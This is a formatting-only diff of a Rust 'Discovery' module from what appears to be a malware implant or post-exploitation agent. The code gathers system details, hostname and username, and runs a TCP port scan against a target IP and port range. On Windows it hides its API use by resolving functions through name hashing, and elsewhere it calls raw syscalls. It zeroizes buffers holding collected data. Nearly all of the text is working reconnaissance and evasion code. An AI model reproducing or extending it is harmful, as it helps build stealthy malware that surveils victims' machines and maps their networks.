@@ -1,14 +1,14 @@
-use alloc::string::String;
-use alloc::format;
 use crate::utils::sensitive::SensitiveData;
+use alloc::format;
+use alloc::string::String;
 use zeroize::Zeroize;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
-use crate::utils::windows_definitions::*;
-#[cfg(target_os = "windows")]
 use crate::utils::syscalls::SockAddrIn;
+#[cfg(target_os = "windows")]
+use crate::utils::windows_definitions::*;
 
 pub struct Discovery;
 
@@ -36,18 +36,17 @@ impl Discovery {
         unsafe {
             let kernel32 = hash_str(b"kernel32.dll");
             let get_sys_info = resolve_function(kernel32, hash_str(b"GetSystemInfo"));
-            
-            if get_sys_info.is_null() { 
-                output = String::from("Failed to resolve GetSystemInfo"); 
+
+            if get_sys_info.is_null() {
+                output = String::from("Failed to resolve GetSystemInfo");
             } else {
                 type FnGetSystemInfo = unsafe extern "system" fn(*mut SYSTEM_INFO);
                 let mut si: SYSTEM_INFO = core::mem::zeroed();
                 core::mem::transmute::<_, FnGetSystemInfo>(get_sys_info)(&mut si);
 
-                output = format!("Processors: {}\nArch: {}\nPageSize: {}", 
-                    si.dwNumberOfProcessors, 
-                    si.wProcessorArchitecture,
-                    si.dwPageSize
+                output = format!(
+                    "Processors: {}\nArch: {}\nPageSize: {}",
+                    si.dwNumberOfProcessors, si.wProcessorArchitecture, si.dwPageSize
                 );
             }
         }
@@ -56,12 +55,13 @@ impl Discovery {
             unsafe {
                 let mut uts: crate::utils::syscalls::Utsname = core::mem::zeroed();
                 let mut info: crate::utils::syscalls::Sysinfo = core::mem::zeroed();
-                
+
                 let uname_res = crate::utils::syscalls::sys_uname(&mut uts);
                 let sysinfo_res = crate::utils::syscalls::sys_sysinfo(&mut info);
 
                 if uname_res == 0 {
-                    let mut s = format!("OS: {}\nNode: {}\nRelease: {}\nMachine: {}",
+                    let mut s = format!(
+                        "OS: {}\nNode: {}\nRelease: {}\nMachine: {}",
                         c_str_to_str(&uts.sysname),
                         c_str_to_str(&uts.nodename),
                         c_str_to_str(&uts.release),
@@ -69,14 +69,22 @@ impl Discovery {
                     );
 
                     if sysinfo_res == 0 {
-                        let unit = if info.mem_unit == 0 { 1 } else { info.mem_unit as u64 };
+                        let unit = if info.mem_unit == 0 {
+                            1
+                        } else {
+                            info.mem_unit as u64
+                        };
                         let total_mb = (info.totalram * unit) / (1024 * 1024);
                         let free_mb = (info.freeram * unit) / (1024 * 1024);
-                        
-                        s.push_str(&format!("\nUptime: {}s\nLoad: {} {} {}\nMem: {}MB / {}MB\nProcs: {}",
+
+                        s.push_str(&format!(
+                            "\nUptime: {}s\nLoad: {} {} {}\nMem: {}MB / {}MB\nProcs: {}",
                             info.uptime,
-                            info.loads[0] / 65536, info.loads[1] / 65536, info.loads[2] / 65536,
-                            free_mb, total_mb,
+                            info.loads[0] / 65536,
+                            info.loads[1] / 65536,
+                            info.loads[2] / 65536,
+                            free_mb,
+                            total_mb,
                             info.procs
                         ));
                     }
@@ -86,7 +94,7 @@ impl Discovery {
                 }
             }
         }
-        
+
         let mut v = output.into_bytes();
         let sensitive = SensitiveData::new(&v);
         v.zeroize();
@@ -99,18 +107,23 @@ impl Discovery {
         #[cfg(not(target_os = "windows"))]
         unsafe {
             use crate::utils::syscalls::*;
-            
+
             // Expected format: <ip>:<start_port>[-<end_port>]
             let parts: alloc::vec::Vec<&str> = target.split(':').collect();
             if parts.len() == 2 {
                 let ip_str = parts[0];
                 let port_part = parts[1];
-                
+
                 let (start_port, end_port) = if port_part.contains('-') {
                     let range: alloc::vec::Vec<&str> = port_part.split('-').collect();
                     if range.len() == 2 {
-                        (range[0].parse::<u16>().unwrap_or(0), range[1].parse::<u16>().unwrap_or(0))
-                    } else { (0, 0) }
+                        (
+                            range[0].parse::<u16>().unwrap_or(0),
+                            range[1].parse::<u16>().unwrap_or(0),
+                        )
+                    } else {
+                        (0, 0)
+                    }
                 } else {
                     let p = port_part.parse::<u16>().unwrap_or(0);
                     (p, p)
@@ -125,7 +138,9 @@ impl Discovery {
 
                     for port in start_port..=end_port {
                         let sock = sys_socket(2, 1, 0); // AF_INET, SOCK_STREAM
-                        if (sock as isize) < 0 { continue; }
+                        if (sock as isize) < 0 {
+                            continue;
+                        }
 
                         let addr = SockAddrIn {
                             sin_family: 2,
@@ -167,8 +182,13 @@ impl Discovery {
                     let (start_port, end_port) = if port_part.contains('-') {
                         let range: alloc::vec::Vec<&str> = port_part.split('-').collect();
                         if range.len() == 2 {
-                            (range[0].parse::<u16>().unwrap_or(0), range[1].parse::<u16>().unwrap_or(0))
-                        } else { (0, 0) }
+                            (
+                                range[0].parse::<u16>().unwrap_or(0),
+                                range[1].parse::<u16>().unwrap_or(0),
+                            )
+                        } else {
+                            (0, 0)
+                        }
                     } else {
                         let p = port_part.parse::<u16>().unwrap_or(0);
                         (p, p)
@@ -182,7 +202,9 @@ impl Discovery {
 
                     for port in start_port..=end_port {
                         let sock = core::mem::transmute::<_, FnSocket>(socket_fn)(2, 1, 0);
-                        if sock == (-1isize as HANDLE) { continue; }
+                        if sock == (-1isize as HANDLE) {
+                            continue;
+                        }
 
                         let addr = SockAddrIn {
                             sin_family: 2,
@@ -191,7 +213,12 @@ impl Discovery {
                             sin_zero: [0; 8],
                         };
 
-                        if core::mem::transmute::<_, FnConnect>(connect_fn)(sock, &addr as *const _ as *const u8, 16) == 0 {
+                        if core::mem::transmute::<_, FnConnect>(connect_fn)(
+                            sock,
+                            &addr as *const _ as *const u8,
+                            16,
+                        ) == 0
+                        {
                             result.push_str(&format!("{}:{} OPEN\n", ip_str, port));
                         }
 
@@ -200,7 +227,7 @@ impl Discovery {
                 }
             }
         }
-        
+
         let mut v = result.into_bytes();
         let sensitive = SensitiveData::new(&v);
         v.zeroize();
@@ -217,7 +244,11 @@ impl Discovery {
                 type FnGetComputerNameA = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
                 let mut buf = [0u8; 256];
                 let mut len = 256;
-                if core::mem::transmute::<_, FnGetComputerNameA>(get_comp_name)(buf.as_mut_ptr(), &mut len) != 0 {
+                if core::mem::transmute::<_, FnGetComputerNameA>(get_comp_name)(
+                    buf.as_mut_ptr(),
+                    &mut len,
+                ) != 0
+                {
                     let s = core::slice::from_raw_parts(buf.as_ptr(), len as usize);
                     name = String::from_utf8_lossy(s).into_owned();
                 } else {
@@ -238,7 +269,7 @@ impl Discovery {
                 }
             }
         }
-        
+
         let mut v = name.into_bytes();
         let sensitive = SensitiveData::new(&v);
         v.zeroize();
@@ -251,12 +282,16 @@ impl Discovery {
         unsafe {
             let advapi32 = hash_str(b"advapi32.dll");
             let get_user_name = resolve_function(advapi32, hash_str(b"GetUserNameA"));
-            
+
             if !get_user_name.is_null() {
                 type FnGetUserNameA = unsafe extern "system" fn(*mut u8, *mut u32) -> i32;
                 let mut buf = [0u8; 256];
                 let mut len = 256;
-                if core::mem::transmute::<_, FnGetUserNameA>(get_user_name)(buf.as_mut_ptr(), &mut len) != 0 {
+                if core::mem::transmute::<_, FnGetUserNameA>(get_user_name)(
+                    buf.as_mut_ptr(),
+                    &mut len,
+                ) != 0
+                {
                     let s_len = if len > 0 { len - 1 } else { 0 };
                     let s = core::slice::from_raw_parts(buf.as_ptr(), s_len as usize);
                     name = String::from_utf8_lossy(s).into_owned();
@@ -279,7 +314,7 @@ impl Discovery {
                 }
             }
         }
-        
+
         let mut v = name.into_bytes();
         let sensitive = SensitiveData::new(&v);
         v.zeroize();
